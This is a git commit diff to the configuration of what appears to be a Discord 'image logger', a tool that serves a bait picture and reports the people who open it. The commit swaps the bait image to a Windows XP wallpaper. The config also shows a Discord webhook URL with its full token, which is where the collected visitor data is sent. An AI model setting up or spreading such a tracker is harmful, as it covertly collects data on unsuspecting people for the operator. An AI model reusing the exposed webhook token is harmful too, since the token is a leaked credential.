96fd0874ef6a2b696785034599b56bf77f08f05c
Nightbx <jestxd12311@gmail.com>
2026-01-03 12:46:45 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1294351896072683600/3hhGLRFu_R19eetY48IcQXnyyhzDCaOs3rIbQlaZvoW1mdx0dy02BcrARNn8kRldF1e1",
-    "image": "https://giffy-five-blush.vercel.app/api/image.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
